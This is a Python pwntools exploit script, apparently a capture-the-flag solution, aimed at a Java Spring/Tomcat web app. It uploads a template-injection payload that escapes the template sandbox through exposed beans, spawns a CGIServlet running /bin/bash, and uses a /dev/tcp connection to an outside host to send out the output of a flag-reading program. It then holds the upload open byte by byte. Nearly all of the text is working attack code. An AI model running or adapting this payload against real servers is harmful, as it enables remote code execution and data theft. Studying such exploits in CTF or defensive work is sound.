from pwn import *
import sys
import time

# 10240 default threshold
HOST,PORT = sys.argv[1].split(":")
PORT = int(PORT)
print(HOST,PORT)



payload = rb"""
PAYLOAD_START
{#
   we have a few exposed globals to escape the sandbox with -- request, response, and beans
#}
{% set parent = beans.get("dispatcherServlet").getWebApplicationContext().getWebServer().getTomcat().getHost().findChild("") %}
{% set ctx = request.getServletContext() %}


{#
   we can use the InstanceManager to instantiate anything we want :) let's set up a CGIServlet to run executables
#}
{% set cl = ctx.getClassLoader() %}
{% set im = ctx.getAttribute("org.apache.tomcat.InstanceManager") %}
{% set srv = im.newInstance("org.apache.catalina.servlets.CGIServlet", cl) %}



{#
   use a StandardWrapper instance to set config params, this allows us to change the cgi executable
#}
{% set sw = im.newInstance("org.apache.catalina.core.StandardWrapper", cl) %}
{{ sw.setParent(parent) }}
{{ sw.addInitParameter("cgiMethods", "*") }}
{{ sw.addInitParameter("executable", "/bin/bash") }}
{{ sw.addInitParameter("executable-arg-1", "-c") }}
{{ sw.addInitParameter("executable-arg-2", "exec 3<>/dev/tcp/hc.lc/80;echo -e \"GET /log2.php HTTP/1.1\r\nHost: hc.lc\r\nFlag: `/usr/src/app/getflag`\r\nConnection: close\r\n\r\n\" >&3;cat <&3") }}

{#
   here we spoof the request URI so that CGIServlet thinks the file exists (point it to /test.css)
#}
{{ request.setAttribute("javax.servlet.include.request_uri", "1") }}
{{ request.setAttribute("javax.servlet.include.context_path", "") }}
{{ request.setAttribute("javax.servlet.include.servlet_path", "") }}
{{ request.setAttribute("javax.servlet.include.path_info", "/style.css") }}


{#
    finish setup and run the servlet with our request/response objects
#}

PARENT: {{ parent }}
CTX: {{ ctx }}
SW: {{ sw }}
SRV: {{ srv }}


{{ srv.init(sw) }}
{{ srv.service(request, response) }}

PAYLOAD_END
"""

r = remote(HOST, PORT)


r.send(b"POST / HTTP/1.1\r\nHost: "+HOST.encode()+b":"+str(PORT).encode()+b"\r\nConnection: close\r\nContent-Type: multipart/form-data; boundary=meepmoop\r\nContent-Length: 11000\r\n\r\n")
r.send(b"--meepmoop\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"foo\"\r\n\r\n") #74
#r.send(b"--meepmoop\r\nContent-Type: text/plain\r\n\r\n") # 40

r.send(payload)
#r.send(b"a"*10498+b"\r\n") #10500

for i in range(1000):
    r.send(b"B")
    time.sleep(0.1)

